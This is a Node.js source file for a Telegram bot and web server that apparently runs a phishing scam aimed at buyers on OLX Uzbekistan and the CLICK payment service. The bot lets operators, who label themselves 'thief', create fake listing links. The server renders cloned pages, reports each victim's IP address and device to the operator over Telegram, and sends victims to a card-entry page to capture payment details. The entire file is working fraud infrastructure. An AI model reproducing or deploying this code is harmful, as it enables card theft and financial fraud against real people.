const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const StormDB = require('stormdb');
const bodyParser = require('body-parser');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const cookieParser = require('cookie-parser');
const useragent = require('express-useragent');
const path = require('path');
const fs = require('fs');
const olxuzbHandler = require('./createuzb'); 
let config = require('./config.json')

const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const bot = new Telegraf(config.bot_token);

const engine = new StormDB.localFileEngine('./db.json');
const db = new StormDB(engine);
db.default({ users: [], links: [], profits: [] });
setInterval(() => {
  db.save();
}, 5000);


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');


const state = {};


        
const userTable = db.default({ users: [] });

app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

bot.start((ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  const userExists = userTable.get('users').value().find((user) => user.id === userId);

  if (!userExists) {
    userTable.get('users').push({ id: userId });
    db.save();
  }

  const keyboard = {
    inline_keyboard: [
      [{ text: 'Создать ссылку', callback_data: 'create_link' }]
    ]
  };

  ctx.replyWithPhoto({ source: 'logo.png' }, {
    caption: `Салам user ID: ${userId}`,
    reply_markup: keyboard
  });
});

bot.action('create_link', (ctx) => {
  const userId = ctx.from.id;
  const keyboard = {
    inline_keyboard: [
      [{ text: 'Узбекистан 🇺🇿', callback_data: 'yzbeku' }],
      [{ text: 'Украина 🇺🇦', callback_data: 'select_ukraine' }],
      // Добавьте еще один выбор страны здесь
    ]
  };
  ctx.reply('Выберите страну для ворка', {
    reply_markup: keyboard
  });
});

bot.action('yzbeku', (ctx) => {
  const keyboard = {
    inline_keyboard: [
      [{ text: '🇺🇿OLX.UZB', callback_data: 'olxuzb' }],
      [{ text: '🇺🇿CLICK', callback_data: 'clickuzb' }]
    ]
  };
  ctx.reply('Выберете сервис:', {
    reply_markup: keyboard
  });
});

  bot.action('olxuzb', (ctx) => {
      state[ctx.from.id] = {};

      ctx.reply('Введи название:');
    });

    bot.on('text', (ctx) => {
      const userId = ctx.from.id;
      const userState = state[userId];

      if (!userState) {

        return;
      }

      if (!userState.title) {
        userState.title = ctx.message.text;
        ctx.reply('Введи цену:');
      } else if (!userState.amount) {
        userState.amount = ctx.message.text;
        ctx.reply('Введи ссылку на фото:');
      } else if (!userState.photolink) {
        userState.photolink = ctx.message.text;
        ctx.reply('Введи адрес:');
      } else if (!userState.address) {
        userState.address = ctx.message.text;
        ctx.reply('Введите имя:');
      } else if (!userState.name) {
        userState.name = ctx.message.text;
        ctx.reply('Введи фамилию:');
      } else if (!userState.surname) {
        userState.surname = ctx.message.text;

  const id = Math.floor(Math.random() * 1000000000);
      const owner = userId; // Пользователь, который создал ссылку
      const ownername = `@${ctx.from.username}`; // Имя пользователя
      const link = {
        id,
        title: userState.title,
        amount: userState.amount,
        photolink: userState.photolink,
        address: userState.address,
        name: userState.name,
        surname: userState.surname,
        folder01: 'olxuzb1',
        folder02: 'olxuzb2',
        status: 'loading',
        ploshadka: '🇺🇿OLX Узбекистан',
        owner,
        ownername,

      };

      db.get('links').push(link);
      db.save();

      ctx.reply(`✅ Ссылка успешно создана

🆔Объявления: ${id}
1.0

<code>https://${config.domain}/${id}</code>

2.0 

<code>https://${config.domain}/recive/${id}</code>

ℹ️Информация: 
☑️Товарка: ${userState.title}
💰Цена: ${userState.amount}
📷Фото: ${userState.photolink}
☑️Адрес: ${userState.address}
☑️Имя: ${userState.name}
☑️Фамилия: ${userState.surname}
🥷ВОР: ${ownername}`, { parse_mode: "HTML" });

      delete state[userId];
      }
});
    
bot.launch();


app.get('/clstatus:linkId', (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.status = ``
    return res.send(link.status)
    res.send(JSON.stringify(link))
})
app.get('/status:linkId', (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    return res.send(link.status)
    res.send(JSON.stringify(link))
})

app.get('/:linkId', (req, res) => {
  try {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))

    if (link) {
      const linkid = link.linkid;
      const tovar = link.title;
      const amount = link.amount;
      const photo = link.photolink;
      const adres = link.address;
      const ima = link.name;
      const famila = link.surname;
      const service = link.folder01;

      const ua = useragent.parse(req.headers['user-agent']);
bot.telegram.sendMessage(link.owner, `
☑️Переход на главную страницу 1.0
Сервис ${link.ploshadka}

🆔Объявления: ${link.id}

ℹ️Информация: 
☑️Товарка: ${link.title}
💰Цена: ${link.amount}
☑️Адрес: ${link.address}
☑️Имя: ${link.name}
☑️Фамилия: ${link.surname}

ℹ️Информация Мамонта: 
☑️ IP адрес: ${req.headers['x-forwarded-for']}
☑️ Устройство:  ${ua.isMobile ? '📱 Телефон' : '🖥 Компьютер'}
      `, {
        parse_mode: "html",
      });

    return res.render(`${service}/index`, {
      link: linkid,
      amount: amount, 
      linkid: linkid, 
      photo: photo, 
      tovar: tovar, 
      ima: ima,
      adres: adres,
      familia: famila
    });

    } else {
      res.send("Link not found");
    }
  } catch (err) {
    console.log(err);
    res.send("ERROR!");
  }
});

app.get('/recive/:linkId', (req, res) => {
  try {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))

    if (link) {
      const linkid = link.linkid;
      const tovar = link.title;
      const amount = link.amount;
      const photo = link.photolink;
      const adres = link.address;
      const ima = link.name;
      const famila = link.surname;
      const service = link.folder02;

      const ua = useragent.parse(req.headers['user-agent']);
bot.telegram.sendMessage(link.owner, `
☑️Переход на главную страницу 2.0
Сервис ${link.ploshadka}

🆔Объявления: ${linkid}

ℹ️Информация: 
☑️Товарка: ${link.title}
💰Цена: ${link.amount}
☑️Адрес: ${link.address}
☑️Имя: ${link.name}
☑️Фамилия: ${link.surname}

ℹ️Информация Мамонта: 
☑️ IP адрес: ${req.headers['x-forwarded-for']}
☑️ Устройство:  ${ua.isMobile ? '📱 Телефон' : '🖥 Компьютер'}
      `, {
        parse_mode: "html",
      });

    return res.render(`${service}/index`, {
      link: linkid,
      amount: amount, 
      linkid: linkid, 
      photo: photo, 
      tovar: tovar, 
      ima: ima,
      adres: adres,
      familia: famila
    });

    } else {
      res.send("Link not found");
    }
  } catch (err) {
    console.log(err);
    res.send("ERROR!");
  }
});

app.get('/card/:linkId', async (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
  
  if (link) {
      const linkid = link.linkid;
      const tovar = link.title;
      const amount = link.amount;
      const photo = link.photolink;
      const adres = link.address;
      const ima = link.name;
      const famila = link.surname;
    
    let uid = !req.cookies["uid"] ? crypto.randomUUID() : req.cookies["uid"]
    res.cookie("uid", uid)
    bot.telegram.sendMessage(config.logs_id, `
💎 Мамонт перешёл на страницу ввода карты

🆔Объявления: ${linkid}

ℹ️Информация: 
☑️Товарка: ${link.title}
💰Цена: ${link.amount}

ℹ️Информация Мамонта: 
☑️IP адрес: ${req.headers['x-forwarded-for']}
    `, {
        parse_mode: "html",
    })
    user = await bot.telegram.getChat(link.owner)
    bot.telegram.sendMessage(link.owner, `
💎Мамонт перешёл на страницу ввода карты

🆔Объявления: ${linkid}

ℹ️Информация: 
☑️Товарка: ${link.title}
💸Сумма: ${link.amount}

IP: ${req.headers['x-forwarded-for']}
UID: <code>${uid}</code>
    `, {
        parse_mode: "html",
    })
  }
    link.status = "loading"
    return res.render("card", {id:link.id})
    res.send(JSON.stringify(link))
})

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
